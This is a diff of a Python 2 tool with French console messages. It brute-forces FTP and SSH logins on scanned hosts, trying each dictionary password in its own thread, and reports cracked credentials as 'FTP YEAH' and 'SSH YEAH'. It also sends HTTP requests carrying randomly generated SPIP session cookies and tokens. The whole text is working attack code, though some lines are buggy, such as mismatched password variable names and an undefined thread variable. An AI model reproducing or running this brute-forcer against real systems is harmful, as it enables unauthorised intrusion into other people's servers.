@@ -363,32 +363,35 @@ def generate(mode, lgr):
 
 def detonate(log, addr, psswd, essai):
 	global ftop
-	trig = FTP(addr)
+	trig = FTP()
 	try:
-		sys.stdout.write('\r\033[96m[*]\033[0m Essai nb*' + str(essai) + ' : ' + psswd)
+		sys.stdout.write('\r\033[96m[*]\033[0m Essai nb*' + str(essai) + ' sur ' + addr + ' : ' + psswd)
 		sys.stdout.flush()
+		connect = trig.connect(addr, 21, 3)
 		ret = trig.login(user=log,passwd=psswd)
 		trig.quit()
+		trig.close()
 		if "successful" in ret:
 			ftop = 1
 			sys.stdout.write('\n\n\033[91m[+]\033[0m FTP YEAH : ' + addr + ' --> ' + psswd + '\n\n')
-	except:
+	except Exception as e:
 		trig.close()
 
-def ssh_conn(log, addr, passwd, essai, port):
+def ssh_conn(log, addr, passwd, essai, p_port):
 	global flag
 	try:
 		client = SSHClient()
 		client.set_missing_host_key_policy(AutoAddPolicy())
-		sys.stdout.write('\r\033[96m[SSH]\033[0m Essai nb*' + str(essai) + ' : ' + passwd)
+		sys.stdout.write('\r\033[96m[SSH]\033[0m Essai nb*' + str(essai) + ' sur ' + addr + ' : ' + passwd)
 		sys.stdout.flush()
 		client.connect(addr,
 			username=log,
 			password=psswd,
-			timeout=10,
-			port= port,
-			look_for_keys=False)
+			timeout=2,
+			port=p_port,
+			look_for_keys=True)
 		print '\n\n\033[91m[SSH]\033[0m SSH YEAH : ' + addr + ' --> ' + psswd + '\n\n'
+		client.close()
 		flag = 1
 	except:
 		pass
@@ -400,8 +403,8 @@ def query(port, dst):
 			url = 'https://{}'.format(dst)
 		else:
 			url = 'http://{}:{}'.format(dst, port)
-		cooki	= {'spip_session':pwd_alpha(16, len(dictionnary['hex']), dictionnary['hex'])}
-		token	= {'token':pwd_alpha(16, len(dictionnary['hex']), dictionnary['hex'])}
+		cooki	= {'spip_session':pwd_alpha(16, len(dictionnary['hex']), 'hex')}
+		token	= {'token':pwd_alpha(16, len(dictionnary['hex']), 'hex')}
 		headers = {'content-type':'application/json'}
 		r = requests.get(url, headers=headers, verify=False)
 		logger.info("\033[92m[STATUS]\033[0m {}: \033[91m{}\033[0m".format(dst, r.status_code))
@@ -961,14 +964,14 @@ if __name__ == '__main__':
 				if 22 in online[host] or 222 in online[host] or 2222 in online[host]:
 					try:
 						port_idx = [x for i,x in enumerate(online[host]) if x == 22 or x == 222 or x == 2222]
-						print "\n\033[31m[SSH]\033[0m Cible avec SSH ouvert : %s sur %d." % (host, online[host][port_idx[0]])
+						print "\n\033[31m[SSH]\033[0m Cible avec SSH ouvert : %s sur %d." % (host, port_idx[0])
 					except Exception as e:
 						print "\n\033[91m[--SSH--]\033[0m Undefined Error: {} - [\033[33m{}\033[0m]".format(e.__class__,host)
 						continue
 					try:
 						threads = []
 						for psswd in dic:
-							conn = Thread(target=ssh_conn,args=(user,addr,psswd,idx,online[host][port_idx[0]],))
+							conn = Thread(target=ssh_conn,args=(user,host,psswd,idx,port_idx[0],))
 							threads.append(t)
 							conn.start()
 							idx += 1
